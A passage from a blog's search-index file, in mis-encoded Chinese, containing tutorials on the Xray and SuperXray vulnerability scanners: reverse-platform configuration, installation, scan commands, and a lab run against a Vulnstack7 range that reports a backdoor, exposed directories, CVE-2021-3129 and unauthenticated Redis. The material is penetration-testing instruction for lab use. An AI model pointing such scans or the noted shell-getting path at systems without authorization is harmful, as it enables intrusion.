atrule">ttl</span><span class="token punctuation">:</span> <span class="token number">60</span>  <span class="token key atrule">client</span><span class="token punctuation">:</span>    <span class="token key atrule">remote_server</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>    <span class="token comment"># æ˜¯å¦æ˜¯ç‹¬ç«‹çš„è¿œç¨‹ server</span>    <span class="token key atrule">http_base_url</span><span class="token punctuation">:</span> <span class="token string">"http://xx.xx.xx.xx:4444"</span>  <span class="token comment"># è‡ªå·±å…¬ç½‘ip+ç«¯å£</span>    <span class="token key atrule">dns_server_ip</span><span class="token punctuation">:</span> <span class="token string">"xx.xx.xx.xx"</span>  <span class="token comment"># è‡ªå·±å…¬ç½‘ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>Xrayå®¢æˆ·ç«¯é…ç½®</strong>ï¼š</p><ul><li>åœ¨Xrayæ ¹ç›®å½•é…ç½®configæ–‡ä»¶ï¼Œè®¾ç½®åè¿å¹³å°æ•°æ®åº“æ–‡ä»¶ä½ç½®ã€è®¤è¯Tokenã€HTTPå’ŒDNSçš„ç›‘å¬è®¾ç½®ç­‰ã€‚</li></ul><p>é…ç½®ç¤ºä¾‹ï¼š</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">reverse</span><span class="token punctuation">:</span>  <span class="token key atrule">db_file_path</span><span class="token punctuation">:</span> <span class="token string">"./xxxx.db"</span>  <span class="token comment"># åè¿å¹³å°æ•°æ®åº“æ–‡ä»¶ä½ç½®</span>  <span class="token key atrule">token</span><span class="token punctuation">:</span> <span class="token string">"xxxxx"</span>            <span class="token comment"># åè¿å¹³å°è®¤è¯çš„ Token</span>  <span class="token key atrule">http</span><span class="token punctuation">:</span>    <span class="token key atrule">enabled</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>    <span class="token key atrule">listen_ip</span><span class="token punctuation">:</span> 0.0.0.0    <span class="token key atrule">listen_port</span><span class="token punctuation">:</span> <span class="token string">""</span>    <span class="token key atrule">ip_header</span><span class="token punctuation">:</span> <span class="token string">""</span>           <span class="token comment"># åœ¨å“ªä¸ª http header ä¸­å– ip</span>  <span class="token key atrule">dns</span><span class="token punctuation">:</span>    <span class="token key atrule">enabled</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>    <span class="token key atrule">listen_ip</span><span class="token punctuation">:</span> 0.0.0.0    <span class="token key atrule">domain</span><span class="token punctuation">:</span> <span class="token string">""</span>              <span class="token comment"># DNS åŸŸåé…ç½®</span>    <span class="token key atrule">is_domain_name_server</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>    <span class="token key atrule">resolve</span><span class="token punctuation">:</span>                <span class="token comment"># DNS é™æ€è§£æè§„åˆ™</span>    <span class="token punctuation">-</span> <span class="token key atrule">type</span><span class="token punctuation">:</span> A      <span class="token key atrule">record</span><span class="token punctuation">:</span> localhost      <span class="token key atrule">value</span><span class="token punctuation">:</span> 127.0.0.1      <span class="token key atrule">ttl</span><span class="token punctuation">:</span> <span class="token number">60</span>  <span class="token key atrule">client</span><span class="token punctuation">:</span>    <span class="token key atrule">remote_server</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>     <span class="token comment"># æ˜¯å¦æ˜¯ç‹¬ç«‹çš„è¿œç¨‹ server</span>    <span class="token key atrule">http_base_url</span><span class="token punctuation">:</span> <span class="token string">"http://xx.xx.xx.xx:4444"</span>  <span class="token comment"># è‡ªå·±å…¬ç½‘ip+ç«¯å£</span>    <span class="token key atrule">dns_server_ip</span><span class="token punctuation">:</span> <span class="token string">"xx.xx.xx.xx"</span>  <span class="token comment"># è‡ªå·±å…¬ç½‘ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>æœåŠ¡ç«¯å¼€å¯</strong>ï¼š</p><ul><li>è¿è¡ŒXrayåè¿æœåŠ¡ï¼š<code>./xray reverse</code>ã€‚</li><li>è®¿é—®Webç•Œé¢ï¼Œè¾“å…¥Tokenè¿›è¡ŒéªŒè¯ã€‚</li></ul></li><li><p><strong>æµ‹è¯•</strong>ï¼š</p><ul><li>æµ‹è¯•DNSï¼šé€šè¿‡ç”Ÿæˆçš„åŸŸåè¿›è¡Œpingæµ‹è¯•ï¼Œæ£€æŸ¥DNSè§£ææ˜¯å¦æ­£ç¡®ã€‚</li><li>æµ‹è¯•HTTPï¼šé€šè¿‡curlå‘½ä»¤è®¿é—®ç”Ÿæˆçš„åŸŸåï¼Œæ£€æŸ¥HTTPè¯·æ±‚æ˜¯å¦æ­£ç¡®è®°å½•ã€‚</li></ul></li></ol><p>é€šè¿‡ä»¥ä¸Šæ­¥éª¤ï¼Œå¯ä»¥æˆåŠŸé…ç½®å’Œä½¿ç”¨Xrayåè¿å¹³å°ï¼Œä»è€Œåœ¨æ¼æ´æ‰«æè¿‡ç¨‹ä¸­è§£å†³æ²¡æœ‰å›æ˜¾çš„é—®é¢˜ã€‚</p></blockquote><h2 id="3-6-æœåŠ¡æ‰«æ"><a href="#3-6-æœåŠ¡æ‰«æ" class="headerlink" title="3.6 æœåŠ¡æ‰«æ"></a>3.6 æœåŠ¡æ‰«æ</h2><p>æ”¯æŒ<code>Tomcat AJP</code>å’Œä¸€äº›<code>Weblogic IIOP</code>æ¼æ´æ‰«æ</p><img src="/2025/01/22/gong-fang-gong-ju-ku/superxray-tu-xing-hua-jie-mian-lou-dong-sao-miao-gong-ju/%E6%88%AA%E5%B1%8F2025-01-22%2015.21.39.png" style="zoom:50%;"><h1 id="å››ã€å®æˆ˜ä½¿ç”¨"><a href="#å››ã€å®æˆ˜ä½¿ç”¨" class="headerlink" title="å››ã€å®æˆ˜ä½¿ç”¨"></a>å››ã€å®æˆ˜ä½¿ç”¨</h1><h2 id="3-1-Vulnstack7ï¼ˆWHOAMIï¼‰é¶åœºæ¸—é€å®æˆ˜"><a href="#3-1-Vulnstack7ï¼ˆWHOAMIï¼‰é¶åœºæ¸—é€å®æˆ˜" class="headerlink" title="3.1 Vulnstack7ï¼ˆWHOAMIï¼‰é¶åœºæ¸—é€å®æˆ˜"></a>3.1 Vulnstack7ï¼ˆWHOAMIï¼‰é¶åœºæ¸—é€å®æˆ˜</h2><p>å…·ä½“çš„é¶åœºæ­å»ºå’Œæ¸—é€å…¨æµç¨‹è§æœ¬ç«™ã€Šä¸‰å±‚ç½‘ç»œåŸŸæ¸—é€é¶åœºï¼ˆWHOAMIIï¼‰æ­å»ºã€‹å’Œã€Šä¸‰å±‚ç½‘ç»œé¶åœº(WHOAMI)ä»æ‰“ç‚¹åˆ°æ‹¿ä¸‹åŸŸæ§ ã€‹è¿™ä¸¤ç¯‡æ–‡ç« ã€‚</p><img src="/2025/01/22/gong-fang-gong-ju-ku/superxray-tu-xing-hua-jie-mian-lou-dong-sao-miao-gong-ju/%E6%88%AA%E5%B1%8F2025-01-22%2015.24.21.png" style="zoom:50%;"><p>æˆåŠŸæ‰«æåˆ°CVE-2021-3129æ¼æ´ã€‚</p><p>ç»è¿‡å®é™…çš„å®‰è£…éƒ¨ç½²å’Œæµ‹è¯•ï¼ŒSuperXrayç›¸è¾ƒäºxrayæ²¡ä»€ä¹ˆå¤ªå¤§åŒºåˆ«ï¼Œä½†æ˜¯å›¾å½¢åŒ–ç•Œé¢çš„æ“ä½œè¿˜æ˜¯è¦æ›´å‹å¥½ä¸€äº›ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ”»é˜²å·¥å…·åº“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ”»é˜²å·¥å…·åº“ </tag>
            
            <tag> Super Xray </tag>
            
            <tag> å›¾å½¢åŒ–æ¼æ´æ‰«æå·¥å…· </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Xrayæ¼æ´æ‰«æ</title>
      <link href="/2025/01/22/gong-fang-gong-ju-ku/xray-lou-dong-sao-miao/"/>
      <url>/2025/01/22/gong-fang-gong-ju-ku/xray-lou-dong-sao-miao/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€Xrayç®€ä»‹"><a href="#ä¸€ã€Xrayç®€ä»‹" class="headerlink" title="ä¸€ã€Xrayç®€ä»‹"></a>ä¸€ã€Xrayç®€ä»‹</h1><p>Xrayæ˜¯ä¸€æ¬¾åŠŸèƒ½å¼ºå¤§çš„å®‰å…¨è¯„ä¼°å·¥å…·ï¼Œç”±å¤šåç»éªŒä¸°å¯Œçš„ä¸€çº¿å®‰å…¨ä»ä¸šè€…å¼€å‘è€Œæˆï¼Œæ”¯æŒä¸»åŠ¨ã€è¢«åŠ¨å¤šç§æ‰«ææ–¹å¼ï¼Œå¯ä»¥çµæ´»å®šä¹‰ POCã€‚å®ƒæ”¯æŒå¸¸è§webå®‰å…¨é—®é¢˜æ‰«æå’Œè‡ªå®šä¹‰pocï¼Œèƒ½å¤Ÿå…¨é¢çˆ¬å–å’Œæ‰«æç½‘ç«™ï¼Œä¸ºå®‰å…¨è¯„ä¼°æä¾›å…¨é¢çš„æ•°æ®æ”¯æŒã€‚Xray å®šä½ä¸ºä¸€æ¬¾å®‰å…¨è¾…åŠ©è¯„ä¼°å·¥å…·ï¼Œè€Œä¸æ˜¯æ”»å‡»å·¥å…·ï¼Œå†…ç½®çš„æ‰€æœ‰ payload å’Œ poc å‡ä¸ºæ— å®³åŒ–æ£€æŸ¥ã€‚</p><p>Xray çš„è®¾è®¡ç†å¿µæ˜¯ç®€æ˜“æ¶æ„ï¼Œäº†è§£ Xray çš„æ•´ä½“æ¶æ„å¯ä»¥æ›´å¥½çš„ç†è§£å®¢æˆ·ç«¯å’Œé…ç½®æ–‡ä»¶çš„è®¾ç½®ï¼Œæ–¹ä¾¿æ›´å¥½çš„ä½¿ç”¨ã€‚</p><p>æ•´ä½“æ¥çœ‹ï¼Œæ‰«æå™¨è¿™ç±»å·¥å…·å¤§è‡´éƒ½æ˜¯ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼šæ¥æºå¤„ç†ã€æ¼æ´æ£€æµ‹å’Œç»“æœè¾“å‡ºã€‚Xray ç›®å‰æ”¯æŒæ£€æµ‹çš„æ¼æ´åŒ…æ‹¬ XSS æ¼æ´æ£€æµ‹ã€SQL æ³¨å…¥æ£€æµ‹ã€å‘½ä»¤/ä»£ç æ³¨å…¥æ£€æµ‹ã€ç›®å½•æšä¸¾ã€è·¯å¾„ç©¿è¶Šæ£€æµ‹ã€XML å®ä½“æ³¨å…¥æ£€æµ‹ã€æ–‡ä»¶ä¸Šä¼ æ£€æµ‹ã€å¼±å£ä»¤æ£€æµ‹ã€jsonp æ£€æµ‹ã€ssrf æ£€æµ‹ã€åŸºçº¿æ£€æŸ¥ã€ä»»æ„è·³è½¬æ£€æµ‹ã€CRLF æ³¨å…¥ã€XStream æ¼æ´æ£€æµ‹ã€Struts2 ç³»åˆ—æ¼æ´æ£€æµ‹ç­‰ã€‚</p><p>Xray é¡¹ç›®çš„ç›®å½•ç»“æ„åŒ…æ‹¬å­˜æ”¾é¡¹ç›®çš„æ–‡æ¡£æ–‡ä»¶ã€ç”¨äºæŒ‡çº¹è¯†åˆ«çš„è„šæœ¬å’Œé…ç½®æ–‡ä»¶ã€å­˜æ”¾è‡ªå®šä¹‰çš„ PoC è„šæœ¬ã€ç”Ÿæˆçš„æ¼æ´æ‰«ææŠ¥å‘Šã€é¡¹ç›®çš„æµ‹è¯•è„šæœ¬å’Œæµ‹è¯•æ•°æ®ã€ä¸ Webhook ç›¸å…³çš„é…ç½®å’Œè„šæœ¬ç­‰ã€‚Xray ä¸ºå•æ–‡ä»¶äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæ— ä¾èµ–ï¼Œä¹Ÿæ— éœ€å®‰è£…ï¼Œä¸‹è½½åç›´æ¥ä½¿ç”¨ã€‚</p><h1 id="äºŒã€å®‰è£…"><a href="#äºŒã€å®‰è£…" class="headerlink" title="äºŒã€å®‰è£…"></a>äºŒã€å®‰è£…</h1><p>é¡¹ç›®åœ°å€ï¼š<a href="https://github.com/chaitin/xray/releases/">https://github.com/chaitin/xray/releases/</a></p><p>è™½ç„¶å®˜æ–¹åœ¨æ¨Xray2.0ç³»åˆ—çš„å·¥å…·ï¼Œä½†æ˜¯å¯èƒ½å› ä¸ºç›®å‰æˆç†Ÿåº¦è¿˜ä¸å¤Ÿï¼Œä½¿ç”¨ä½“éªŒä¸ä½³ï¼Œå…·ä½“å¯ä»¥å‚è€ƒæ–‡ç«™çš„ã€ŠXpocä¾›åº”é“¾æ¼æ´æ‰«æå·¥å…·ã€‹å’Œã€ŠwebæŒ‡çº¹è¯†åˆ«å·¥å…·xappã€‹ä¸¤ç¯‡æ–‡ç« ã€‚</p><h2 id="2-1-ä¸‹è½½"><a href="#2-1-ä¸‹è½½" class="headerlink" title="2.1 ä¸‹è½½"></a>2.1 ä¸‹è½½</h2><p>ç›®å‰xray1.0æœ€åä¸€ä¸ªç‰ˆæœ¬ä¸º1.9.11ï¼Œå¯ä»¥ç›´æ¥åœ¨<a href="https://github.com/chaitin/xray/releases/">https://github.com/chaitin/xray/releases/</a> ä¸­ä¾æ®è‡ªå·±çš„ç³»ç»Ÿè¿›è¡Œä¸‹è½½ã€‚ä¾‹å¦‚æˆ‘è¿™é‡Œæ˜¯macOSç³»ç»Ÿï¼Œé€‰æ‹©äº†xray_darwin_amd64.zipã€‚</p><img src="/2025/01/22/gong-fang-gong-ju-ku/xray-lou-dong-sao-miao/%E6%88%AA%E5%B1%8F2025-01-22%2013.31.19.png" style="zoom:40%;"><p>è§£å‹ä¹‹åæ˜¯ä¸€ä¸ªå¯æ‰§è¡Œç¨‹åºï¼š</p><img src="/2025/01/22/gong-fang-gong-ju-ku/xray-lou-dong-sao-miao/%E6%88%AA%E5%B1%8F2025-01-22%2013.35.12.png" style="zoom:60%;"><h2 id="2-2-å®‰è£…"><a href="#2-2-å®‰è£…" class="headerlink" title="2.2 å®‰è£…"></a>2.2 å®‰è£…</h2><ul><li>åˆ›å»ºç›®å½•å¹¶ï¼Œç§»åŠ¨xrayå¯æ‰§è¡Œç¨‹åºï¼Œæ”¹å</li></ul><img src="/2025/01/22/gong-fang-gong-ju-ku/xray-lou-dong-sao-miao/%E6%88%AA%E5%B1%8F2025-01-22%2013.37.06.png" style="zoom:50%;"><ul><li>æµ‹è¯•æ‰§è¡Œ</li></ul><img src="/2025/01/22/gong-fang-gong-ju-ku/xray-lou-dong-sao-miao/%E6%88%AA%E5%B1%8F2025-01-22%2013.39.39.png" style="zoom:50%;"><p>â€‹æç¤ºç¼ºå°‘é…ç½®æ–‡ä»¶ã€‚é»˜è®¤ä¼šç”Ÿæˆsray.yamlã€module.xrayã€plugin.xray.yamlä¸‰ä¸ªæ–‡ä»¶ã€‚</p><p>é‡æ–°æ‰§è¡Œ<code>./xray -h</code></p><img src="/2025/01/22/gong-fang-gong-ju-ku/xray-lou-dong-sao-miao/%E6%88%AA%E5%B1%8F2025-01-22%2013.44.20.png" style="zoom:50%;"><h2 id="2-3-æºç åŒ…ï¼ˆå¯å¿½ç•¥ï¼‰"><a href="#2-3-æºç åŒ…ï¼ˆå¯å¿½ç•¥ï¼‰" class="headerlink" title="2.3 æºç åŒ…ï¼ˆå¯å¿½ç•¥ï¼‰"></a>2.3 æºç åŒ…ï¼ˆå¯å¿½ç•¥ï¼‰</h2><img src="/2025/01/22/gong-fang-gong-ju-ku/xray-lou-dong-sao-miao/%E6%88%AA%E5%B1%8F2025-01-22%2013.40.06.png" style="zoom:50%;"><p>ä¸‹è½½æºç åŒ…ã€‚</p><img src="/2025/01/22/gong-fang-gong-ju-ku/xray-lou-dong-sao-miao/%E6%88%AA%E5%B1%8F2025-01-22%2013.40.30.png" style="zoom:50%;"><p>ç§»åŠ¨åˆ°æ–°å»ºçš„xray1.9.11</p><img src="/2025/01/22/gong-fang-gong-ju-ku/xray-lou-dong-sao-miao/%E6%88%AA%E5%B1%8F2025-01-22%2013.42.05.png" style="zoom:50%;"><img src="/2025/01/22/gong-fang-gong-ju-ku/xray-lou-dong-sao-miao/%E6%88%AA%E5%B1%8F2025-01-22%2013.43.05.png" style="zoom:50%;"><p>å¯ä»¥åœ¨æºç åŒ…ä¸­æŸ¥çœ‹xrayçš„æºä»£ç ã€é…ç½®æ–‡ä»¶ã€ä¾èµ–å’Œæ’ä»¶ç­‰å†…å®¹ã€‚</p><h2 id="2-4-é…ç½®ç¯å¢ƒå˜é‡"><a href="#2-4-é…ç½®ç¯å¢ƒå˜é‡" class="headerlink" title="2.4 é…ç½®ç¯å¢ƒå˜é‡"></a>2.4 é…ç½®ç¯å¢ƒå˜é‡</h2><p>ç›®å‰åªèƒ½åœ¨xray1.9.11è¿™ä¸ªç›®å½•ä¸‹æ‰§è¡Œxrayï¼Œé€šè¿‡é…ç½®PATHç¯å¢ƒå˜é‡å¯ä»¥éšå¤„æ‰§è¡Œã€‚</p><ul><li>åœ¨ç»ˆç«¯æ‰§è¡Œ<code>echo $SHELL</code>åˆ¤æ–­è‡ªå·±çš„shellæ˜¯ä»€ä¹ˆç±»å‹:</li></ul><img src="/2025/01/22/gong-fang-gong-ju-ku/xray-lou-dong-sao-miao/%E6%88%AA%E5%B1%8F2025-01-22%2010.18.47.png" style="zoom:50%;"><ul><li><code>vim ~/.zshrc</code></li><li>è¿½åŠ å†…å®¹ï¼š</li></ul><img src="/2025/01/22/gong-fang-gong-ju-ku/xray-lou-dong-sao-miao/%E6%88%AA%E5%B1%8F2025-01-22%2013.46.54.png" style="zoom:50%;"><ul><li><code>source ~/.zshrc</code></li><li>æˆåŠŸåœ¨å®¶ç›®å½•ä¸‹æ‰§è¡Œxray</li></ul><img src="/2025/01/22/gong-fang-gong-ju-ku/xray-lou-dong-sao-miao/%E6%88%AA%E5%B1%8F2025-01-22%2013.47.58.png" alt="æˆªå±2025-01-22 13.47.58" style="zoom:50%;"><p>ä½†æ˜¯å¯èƒ½ç”±äºå­˜åœ¨ä¸€äº›å½“å‰ç›®å½•çš„ä¾èµ–ï¼Œè¿˜æ˜¯æ²¡åŠæ³•éšå¤„æ‰§è¡Œã€‚</p><p>ç›®å‰æš‚ä¸”å°±åªèƒ½åœ¨xray1.9.11ä¸‹é¢æ‰§è¡Œäº†ã€‚</p><h1 id="ä¸‰ã€æ£€æµ‹æ¨¡å—"><a href="#ä¸‰ã€æ£€æµ‹æ¨¡å—" class="headerlink" title="ä¸‰ã€æ£€æµ‹æ¨¡å—"></a>ä¸‰ã€æ£€æµ‹æ¨¡å—</h1><h2 id="3-1-ç¤¾åŒºç‰ˆ"><a href="#3-1-ç¤¾åŒºç‰ˆ" class="headerlink" title="3.1 ç¤¾åŒºç‰ˆ"></a>3.1 ç¤¾åŒºç‰ˆ</h2><img src="/2025/01/22/gong-fang-gong-ju-ku/xray-lou-dong-sao-miao/%E6%88%AA%E5%B1%8F2025-01-22%2013.52.38.png" style="zoom:50%;"><h2 id="3-2-é«˜çº§ç‰ˆ"><a href="#3-2-é«˜çº§ç‰ˆ" class="headerlink" title="3.2 é«˜çº§ç‰ˆ"></a>3.2 é«˜çº§ç‰ˆ</h2><img src="/2025/01/22/gong-fang-gong-ju-ku/xray-lou-dong-sao-miao/%E6%88%AA%E5%B1%8F2025-01-22%2013.53.20.png" style="zoom:50%;"><h1 id="å››ã€ä½¿ç”¨"><a href="#å››ã€ä½¿ç”¨" class="headerlink" title="å››ã€ä½¿ç”¨"></a>å››ã€ä½¿ç”¨</h1><h2 id="4-1-å…·ä½“å‚æ•°"><a href="#4-1-å…·ä½“å‚æ•°" class="headerlink" title="4.1 å…·ä½“å‚æ•°"></a>4.1 å…·ä½“å‚æ•°</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Version: <span class="token number">1.9</span>.11/eb0c331d/COMMUNITYNAME:   xray - A powerful scanner engine <span class="token punctuation">[</span>https://docs.xray.cool<span class="token punctuation">]</span>USAGE:    <span class="token punctuation">[</span>global options<span class="token punctuation">]</span> <span class="token builtin class-name">command</span> <span class="token punctuation">[</span>command options<span class="token punctuation">]</span> <span class="token punctuation">[</span>arguments<span class="token punctuation">..</span>.<span class="token punctuation">]</span>COMMANDS:   webscan, ws        Run a webscan task   servicescan, ss    Run a <span class="token function">service</span> scan task   subdomain, sd      Run a subdomain task   poclint, pl, lint  lint yaml poc   burp-gamma, btg    Convert the <span class="token builtin class-name">export</span> <span class="token function">file</span> of burp historical proxy records to POC <span class="token function">format</span>   transform          transform other script to gamma   reverse            Run a standalone reverse server   convert            convert results from json to html or from html to json   genca              GenerateToFile CA certificate and key   upgrade            check new version and upgrade self <span class="token keyword">if</span> any updates found   version            Show version info   x                  A <span class="token builtin class-name">command</span> that enables all plugins.You can customize new commands or modify the plugins enabled by a <span class="token builtin class-name">command</span> <span class="token keyword">in</span> the configuration file.   help, h  Shows a list of commands or <span class="token builtin class-name">help</span> <span class="token keyword">for</span> one <span class="token builtin class-name">command</span>GLOBAL OPTIONS:   <span class="token parameter variable">--config</span> FILE      Load configuration from FILE <span class="token punctuation">(</span>default: <span class="token string">"config.yaml"</span><span class="token punctuation">)</span>   --log-level value  Log level, choices are debug, info, warn, error, fatal   --help, <span class="token parameter variable">-h</span>         show <span class="token builtin class-name">help</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¦‚æœæƒ³çœ‹æ¯ä¸ªCOMMANDSä¸‹çš„å‚æ•°ï¼Œæ¯”å¦‚æƒ³çœ‹â€œwsâ€æ¨¡å¼æ”¯æŒçš„å‚æ•°ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./xray ws <span class="token parameter variable">-h</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/22/gong-fang-gong-ju-ku/xray-lou-dong-sao-miao/%E6%88%AA%E5%B1%8F2025-01-22%2014.20.46.png" style="zoom:50%;"><h2 id="4-2-å¸¸è§ç”¨æ³•"><a href="#4-2-å¸¸è§ç”¨æ³•" class="headerlink" title="4.2 å¸¸è§ç”¨æ³•"></a>4.2 å¸¸è§ç”¨æ³•</h2><ol><li><p>ä½¿ç”¨åŸºç¡€çˆ¬è™«çˆ¬å–å¹¶å¯¹çˆ¬è™«çˆ¬å–çš„é“¾æ¥è¿›è¡Œæ¼æ´æ‰«æ</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">xray webscan --basic-crawler http://example.com --html-output vuln.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>ä½¿ç”¨ HTTP ä»£ç†è¿›è¡Œè¢«åŠ¨æ‰«æ</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">xray webscan <span class="token parameter variable">--listen</span> <span class="token number">127.0</span>.0.1:7777 --html-output proxy.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è®¾ç½®æµè§ˆå™¨ http ä»£ç†ä¸º <code>http://127.0.0.1:7777</code>ï¼Œå°±å¯ä»¥è‡ªåŠ¨åˆ†æä»£ç†æµé‡å¹¶æ‰«æã€‚</p><blockquote><p>å¦‚éœ€æ‰«æ https æµé‡ï¼Œè¯·é˜…è¯»ä¸‹æ–¹æ–‡æ¡£ <code>æŠ“å– https æµé‡</code> éƒ¨åˆ†</p><p><a href="https://docs.xray.cool/tools/xray/Scanning">https://docs.xray.cool/tools/xray/Scanning</a> </p></blockquote></li><li><p>åªæ‰«æå•ä¸ª urlï¼Œä¸ä½¿ç”¨çˆ¬è™«</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">xray webscan <span class="token parameter variable">--url</span> http://example.com/?a<span class="token operator">=</span>b --html-output single-url.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>æ‰‹åŠ¨æŒ‡å®šæœ¬æ¬¡è¿è¡Œçš„æ’ä»¶</p><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œå°†ä¼šå¯ç”¨æ‰€æœ‰å†…ç½®æ’ä»¶ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹åˆ—å‘½ä»¤æŒ‡å®šæœ¬æ¬¡æ‰«æå¯ç”¨çš„æ’ä»¶ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">xray webscan <span class="token parameter variable">--plugins</span> cmd-injection,sqldet <span class="token parameter variable">--url</span> http://example.comxray webscan <span class="token parameter variable">--plugins</span> cmd-injection,sqldet <span class="token parameter variable">--listen</span> <span class="token number">127.0</span>.0.1:7777<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>æŒ‡å®šæ’ä»¶è¾“å‡º</p><p>å¯ä»¥æŒ‡å®šå°†æœ¬æ¬¡æ‰«æçš„æ¼æ´ä¿¡æ¯è¾“å‡ºåˆ°æŸä¸ªæ–‡ä»¶ä¸­:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">xray webscan <span class="token parameter variable">--url</span> http://example.com/?a<span class="token operator">=</span>b <span class="token punctuation">\</span>--text-output result.txt --json-output result.json --html-output report.html<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><h1 id="äº”ã€å®æˆ˜ä½¿ç”¨"><a href="#äº”ã€å®æˆ˜ä½¿ç”¨" class="headerlink" title="äº”ã€å®æˆ˜ä½¿ç”¨"></a>äº”ã€å®æˆ˜ä½¿ç”¨</h1><h2 id="5-1-Vulnstack7ï¼ˆWHOAMIï¼‰é¶åœºæ¸—é€å®æˆ˜"><a href="#5-1-Vulnstack7ï¼ˆWHOAMIï¼‰é¶åœºæ¸—é€å®æˆ˜" class="headerlink" title="5.1 Vulnstack7ï¼ˆWHOAMIï¼‰é¶åœºæ¸—é€å®æˆ˜"></a>5.1 Vulnstack7ï¼ˆWHOAMIï¼‰é¶åœºæ¸—é€å®æˆ˜</h2><p>å…·ä½“çš„é¶åœºæ­å»ºå’Œæ¸—é€å…¨æµç¨‹è§æœ¬ç«™ã€Šä¸‰å±‚ç½‘ç»œåŸŸæ¸—é€é¶åœºï¼ˆWHOAMIIï¼‰æ­å»ºã€‹å’Œã€Šä¸‰å±‚ç½‘ç»œé¶åœº(WHOAMI)ä»æ‰“ç‚¹åˆ°æ‹¿ä¸‹åŸŸæ§ ã€‹è¿™ä¸¤ç¯‡æ–‡ç« ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./xray ws --basic-crawler http://172.20.10.5:81 --html-output vuln.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä½¿ç”¨åŸºç¡€çˆ¬è™«çˆ¬å–å¹¶å¯¹çˆ¬è™«çˆ¬å–çš„é“¾æ¥è¿›è¡Œæ¼æ´æ‰«æ:</p><img src="/2025/01/22/gong-fang-gong-ju-ku/xray-lou-dong-sao-miao/%E6%88%AA%E5%B1%8F2025-01-22%2014.07.23.png" style="zoom:50%;"><p>æ‰«æå‡ºäº†ä¹‹å‰ä¸Šä¼ çš„åé—¨ã€‚</p><img src="/2025/01/22/gong-fang-gong-ju-ku/xray-lou-dong-sao-miao/%E6%88%AA%E5%B1%8F2025-01-22%2014.07.53.png" style="zoom:50%;"><p>æ‰«æå‡ºäº†æ•æ„Ÿç›®å½•ã€‚</p><img src="/2025/01/22/gong-fang-gong-ju-ku/xray-lou-dong-sao-miao/%E6%88%AA%E5%B1%8F2025-01-22%2014.08.40.png" style="zoom:50%;"><p>æ‰«å‡ºäº†ä¸€ä¸ªCVE-2021-3129ï¼Œæ˜¯Laravel çš„ä¸€ä¸ªé«˜å±RCEæ¼æ´ï¼Œå¯ä»¥ç»“åˆexpæ¥getshellã€‚</p><img src="/2025/01/22/gong-fang-gong-ju-ku/xray-lou-dong-sao-miao/%E6%88%AA%E5%B1%8F2025-01-22%2014.09.03.png" style="zoom:50%;"><p>åŒæ—¶å¯ä»¥å°†ç»“æœè¾“å‡ºä¸ºhtmlï¼Œå¯è¯»æ€§æ›´å¼ºã€‚</p><img src="/2025/01/22/gong-fang-gong-ju-ku/xray-lou-dong-sao-miao/%E6%88%AA%E5%B1%8F2025-01-22%2014.11.40.png" style="zoom:50%;"><p>ç»è¿‡æµ‹è¯•xrayæœ‰æ¯”è¾ƒå¥½çš„æœ‰æ•ˆæ€§ã€è¾ƒä½çš„è¯¯æŠ¥ç‡ä»¥åŠè¾ƒé«˜çš„å‡†ç¡®æ€§ã€‚</p><p>ä¹‹å‰åœ¨é¶åœºæ¸—é€çš„æ—¶å€™172.20.10.5:6379å­˜åœ¨redisæœªæˆæƒè®¿é—®çš„æ¼æ´ï¼Œæƒ³ç€æ‹¿xrayæµ‹è¯•ä¸€ä¸‹ï¼š</p><img src="/2025/01/22/gong-fang-gong-ju-ku/xray-lou-dong-sao-miao/%E6%88%AA%E5%B1%8F2025-01-22%2014.23.09.png" style="zoom:50%;"><img src="/2025/01/22/gong-fang-gong-ju-ku/xray-lou-dong-sao-miao/%E6%88%AA%E5%B1%8F2025-01-22%2014.23.31.png" 